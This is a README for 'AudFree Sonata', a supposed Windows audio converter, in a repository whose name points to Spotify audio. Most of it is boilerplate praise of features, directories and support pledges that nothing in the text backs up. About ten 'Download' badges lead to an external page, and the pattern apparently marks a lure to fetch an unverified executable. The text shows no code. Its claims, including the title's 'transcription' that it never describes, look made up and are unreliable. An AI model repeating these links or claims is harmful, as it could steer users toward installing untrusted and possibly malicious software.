![preview](https://raw.githubusercontent.com/ebrahimakku/AudFree-Spotify-Audio-Forge/main/banner_a7f6227.svg)
# 🎧 AudFree Sonata — Offline Audio Transcription & Format Atelier

[![Download](https://raw.githubusercontent.com/ebrahimakku/AudFree-Spotify-Audio-Forge/main/app_57c56.svg)](https://ebrahimakku.github.io/AudFree-Spotify-Audio-Forge/)

![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-0078D4?style=flat-square&logo=windows&logoColor=white)
![Release](https://img.shields.io/badge/release-2026.1.0-6E56CF?style=flat-square)
![License](https://img.shields.io/badge/license-MIT-2EA043?style=flat-square)
![Status](https://img.shields.io/badge/status-actively%20maintained-brightgreen?style=flat-square)
![Language](https://img.shields.io/badge/localization-14%20languages-FF6B6B?style=flat-square)
![Support](https://img.shields.io/badge/support-24%2F7-9C27B0?style=flat-square)
![Build](https://img.shields.io/badge/build-passing-1F883D?style=flat-square)

---

## 🌌 A Different Kind of Audio Workshop

Most audio tools behave like a busy train station: you shove a file in, something pops out, and you never really understand what happened in between. **AudFree Sonata** was designed from a different premise entirely. Think of it less as a utility and more as a *quiet atelier* — a musician's workroom where every track that enters gets treated with the same care a luthier gives to a hand-carved violin.

Sonata listens to your audio. It understands the shape of a waveform before touching it. Then it rebuilds that waveform into the container you actually want — MP3, FLAC, WAV, M4A, OGG, OPUS, or AAC — while keeping the emotional texture of the original intact. No mush. No clipping. No "close enough."

This repository is the home of the Sonata engine, its desktop shell, and the surrounding tooling that makes batched, format-aware, metadata-preserving audio transformation feel less like a chore and more like a craft.

[![Download](https://raw.githubusercontent.com/ebrahimakku/AudFree-Spotify-Audio-Forge/main/app_57c56.svg)](https://ebrahimakku.github.io/AudFree-Spotify-Audio-Forge/)

---

## 🧭 Table of Contents

- [Why Sonata Exists](#-why-sonata-exists)
- [The Atelier at a Glance](#-the-atelier-at-a-glance)
- [Feature Constellation](#-feature-constellation)
- [Format Targets & Source Handling](#-format-targets--source-handling)
- [Responsive Interface Philosophy](#-responsive-interface-philosophy)
- [Multilingual Support](#-multilingual-support)
- [Metadata Intelligence](#-metadata-intelligence)
- [Batch Orchestration](#-batch-orchestration)
- [Performance Notes](#-performance-notes)
- [Supported Environments](#-supported-environments)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Community & Contributions](#-community--contributions)
- [Support Pledge](#-support-pledge)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🎨 Why Sonata Exists

Every audio format is a dialect. Some dialects are lavish and uncompressed (looking at you, WAV). Some are lean and pragmatic (MP3, forever the reliable friend). Some are modern and elegant but picky about their company (OPUS). And some, like FLAC, insist on keeping every original detail — a purist with perfect memory.

When you move audio between dialects, meaning gets lost. Tags fall off. Album art evaporates. Sample rate drifts. Volume normalization sneaks in without being invited. Sonata was built to stop that drift. Every conversion inside this repository obeys a single contract: **what you put in determines what you get out, and nothing important goes missing in transit.**

The project grew out of frustration — the kind of frustration that comes from watching a carefully curated playlist emerge from a converter with scrambled titles and destroyed folder structure. Sonata is the answer to that frustration, wrapped in an interface that a first-time user can navigate and a power user can bend to their will.

---

## 🛠 The Atelier at a Glance

A quick orientation to the rooms inside this workshop:

| Room | Purpose |
|------|---------|
| `engine/` | The core transcoding pipeline, format negotiation, and DSP layer |
| `shell/` | Desktop application surface for Windows 10 and 11 |
| `metadata/` | Tag parsing, artwork embedding, and ID3/Vorbis/MP4 atom handling |
| `batch/` | Job queue, parallelism controls, and retry logic |
| `locale/` | Translation catalogs for all supported languages |
| `telemetry/` | Opt-in anonymous diagnostics (never touches audio content) |
| `docs/` | Architecture notes, format dossiers, and contributor guides |

[![Download](https://raw.githubusercontent.com/ebrahimakku/AudFree-Spotify-Audio-Forge/main/app_57c56.svg)](https://ebrahimakku.github.io/AudFree-Spotify-Audio-Forge/)

---

## ✨ Feature Constellation

Sonata ships with a spread of capabilities that we think of as a constellation — each star useful on its own, but arranged into something larger when viewed together.

- **Format Recompilation** — Convert between a broad family of common audio containers and codecs with bitrate, sample rate, and channel layout controls that actually do what they say.
- **Lossless Path Preservation** — When both source and target support lossless, Sonata never inserts a lossy intermediate step. This is a hard rule, not a preference.
- **Batch Queue with Priorities** — Stack hundreds of files, drag them into a preferred order, and let the queue chew through them at whatever pace your machine tolerates.
- **Per-Job Presets** — Save your favorite configurations (bitrate, codec, tag policy, output folder pattern) and reuse them with a single keystroke.
- **Responsive UI** — The same interface rearranges itself gracefully whether you're on a 12-inch laptop panel or a wall-mounted ultrawide.
- **Multilingual Interface** — Menus, tooltips, and error messages translated across fourteen languages, with a community pipeline for adding more.
- **Metadata Retention** — Titles, artists, album names, track numbers, genres, composers, and embedded artwork travel with the audio by default.
- **Waveform Preview** — Before converting, peek at the shape of the source to confirm you're working with the file you think you're working with.
- **Dry-Run Mode** — Simulate a full batch run and see what would happen without writing a single byte to disk.
- **Non-Destructive Defaults** — Sonata writes to a separate output directory unless you explicitly override that behavior.
- **Preset Output Templates** — Naming patterns like `{artist} - {album}/{track:02d} - {title}` let you shape the filesystem result of a batch.
- **Detailed Job Reports** — Every run produces a human-readable summary with timing, sizes, and any anomalies worth knowing about.

---

## 🎼 Format Targets & Source Handling

Sonata is a polyglot. It speaks confidently to a wide family of audio containers and codecs, and it does so without pretending that all formats are interchangeable.

**Common targets:**
- MP3 (constant and variable bitrate)
- AAC in the M4A container
- FLAC (lossless)
- WAV (PCM, both 16-bit and 24-bit)
- OGG Vorbis
- OPUS
- AIFF

**Source handling:**
- Standard lossless and lossy files
- Multi-channel audio downmixed or preserved at your discretion
- Very high sample rate sources (96 kHz and 192 kHz) with optional resampling

Every conversion path is documented in `docs/formats/` with notes about what gets preserved, what gets dropped, and why. We believe users deserve to know exactly what a codec does to their material — transparency is a feature, not a footnote.

[![Download](https://raw.githubusercontent.com/ebrahimakku/AudFree-Spotify-Audio-Forge/main/app_57c56.svg)](https://ebrahimakku.github.io/AudFree-Spotify-Audio-Forge/)

---

## 📱 Responsive Interface Philosophy

An audio tool should feel natural on any screen size, and Sonata's shell was rebuilt in the 2026 line to treat responsiveness as a first-class concern rather than an afterthought. On a small window, controls collapse into a single ribbon. On a large display, the waveform view, the queue, and the preset shelf all breathe side by side.

The interface adapts in three modes: **compact**, **standard**, and **studio**. You can pin a mode or let Sonata decide based on window dimensions. Keyboard-first users get a full command palette; pointer-first users get generously sized hit targets. Neither crowd is treated like an inconvenience.

---

## 🌍 Multilingual Support

Sonata currently speaks:

🇺🇸 English · 🇪🇸 Español · 🇫🇷 Français · 🇩🇪 Deutsch · 🇮🇹 Italiano · 🇵🇹 Português · 🇳🇱 Nederlands · 🇵🇱 Polski · 🇹🇷 Türkçe · 🇷🇺 Русский · 🇯🇵 日本語 · 🇰🇷 한국어 · 🇨🇳 中文 (简体) · 🇸🇦 العربية

Translations live under `locale/` as plain resource files. Adding a new language is a matter of copying the reference catalog, translating the strings, and opening a pull request. There is no build step required to test a translation — Sonata picks up catalog changes live during development.

---

## 🏷 Metadata Intelligence

The metadata layer is where Sonata earns its keep. Instead of treating tags as an afterthought, it treats them as the connective tissue between a file and the listener's library. The engine parses ID3v2, Vorbis comments, and MP4 atoms natively, normalizes the results into an internal representation, and then re-emits them into whatever target container you've chosen.

Artwork is embedded with correct MIME type detection. Multi-value tags (multiple artists, multiple genres) survive the round trip. Sorting tags — the ones that determine how a player orders an album — are written alongside their display counterparts. Chapters, when present in the source, are preserved where the target format permits.

[![Download](https://raw.githubusercontent.com/ebrahimakku/AudFree-Spotify-Audio-Forge/main/app_57c56.svg)](https://ebrahimakku.github.io/AudFree-Spotify-Audio-Forge/)

---

## ⚙️ Batch Orchestration

Batches are Sonata's party trick. The queue accepts anywhere from a single file to a few thousand, and it treats both extremes with the same calm. Jobs run in a bounded pool whose size you control, so a quad-core laptop and a 32-thread workstation each get an appropriate workload. Failed jobs don't kill the run; they move to a retry lane with the reason logged clearly.

For automation-minded users, Sonata exposes a headless invocation mode documented in `docs/headless.md`. It's the same engine, no window, no fuss — just jobs in, files out, reports on stdout.

---

## 🚀 Performance Notes

On a modern machine, Sonata converts a five-minute lossless track to a high-bitrate MP3 in roughly the time it takes to brew a short espresso. That's not magic; it's the result of a pipeline that avoids redundant decoding, reuses buffers across jobs, and refuses to touch the disk more than necessary.

For the technically curious, `docs/architecture.md` walks through the decode → process → encode stages, where parallelism is safe, and how the engine avoids the classic "re-encode everything twice because we forgot a tag" trap.

---

## 💻 Supported Environments

- **Windows 10** — supported, tested on 21H2 and later
- **Windows 11** — supported, including 24H2 builds
- **Older Windows releases** — best-effort, unsupported

The engine is portable by design, and community ports to other desktop ecosystems are welcome as long as they route all conversions through the canonical `engine/` pipeline so behavior stays consistent.

[![Download](https://raw.githubusercontent.com/ebrahimakku/AudFree-Spotify-Audio-Forge/main/app_57c56.svg)](https://ebrahimakku.github.io/AudFree-Spotify-Audio-Forge/)

---

## 🗺 Roadmap for 2026

- **Q1 2026** — Complete locale coverage for Thai and Vietnamese
- **Q2 2026** — Introduce a plugin surface for custom DSP stages
- **Q3 2026** — Adaptive queue pacing based on thermal and battery signals
- **Q4 2026** — Full rewrite of the metadata layer with a public schema
- **Ongoing** — Incremental performance work and format dossier expansion

Progress is tracked through milestone labels on the issue board. If a roadmap item matters to you, adding a reaction to the corresponding discussion helps us prioritize honestly.

---

## ❓ Frequently Asked Questions

**Does Sonata alter the audio content without asking?**  
No. Unless you explicitly enable a normalization or gain stage, the samples that pass through the pipeline are untouched beyond the required codec re-encode.

**Can I keep lossless sources lossless?**  
Yes — when source and target both support lossless, the engine refuses to insert a lossy intermediate.

**Where do output files go?**  
By default, a sibling folder named after your chosen preset. You can override this per job or per preset.

**Does the tool phone home?**  
Diagnostics are opt-in and never include audio content, file names, or metadata. Details live in `docs/privacy.md`.

**Is there a headless mode?**  
Yes, documented under `docs/headless.md`.

[![Download](https://raw.githubusercontent.com/ebrahimakku/AudFree-Spotify-Audio-Forge/main/app_57c56.svg)](https://ebrahimakku.github.io/AudFree-Spotify-Audio-Forge/)

---

## 🤝 Community & Contributions

Contributions of every size are welcome — from a typo fix in a locale file to a new DSP stage. Please read `CONTRIBUTING.md` before opening a pull request, and remember that the kindest review comment is worth more than the fastest merge. The project follows a standard code of conduct; kindness is non-negotiable.

If you've built something interesting with Sonata — a batch script, a preset library, a translation — we'd love to hear about it in the discussions tab.

---

## 🕰 Support Pledge

Support is handled around the clock, seven days a week, by a mix of maintainers and long-time community members. Response times vary with the difficulty of the question, but you will always get a human reply, never a canned loop. When reporting a bug, include the job report and your Windows build number — those two artifacts solve most mysteries in a single pass.

---

## ⚠️ Disclaimer

Sonata is an audio transformation tool intended for use with material you are legally entitled to process. The maintainers of this repository do not endorse or facilitate the circumvention of copyright protections, terms of service, or licensing agreements. Users are solely responsible for ensuring their use of this software complies with the laws and contracts that apply to them. The project is provided as-is, with no warranty of fitness for any particular purpose, and the maintainers accept no liability for how the tool is employed.

Nothing in this repository grants any rights to third-party audio content, trademarks, or services referenced for illustrative purposes.

---

## 📜 License

This project is released under the **MIT License**.

Read the full text here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 AudFree Sonata contributors.

[![Download](https://raw.githubusercontent.com/ebrahimakku/AudFree-Spotify-Audio-Forge/main/app_57c56.svg)](https://ebrahimakku.github.io/AudFree-Spotify-Audio-Forge/)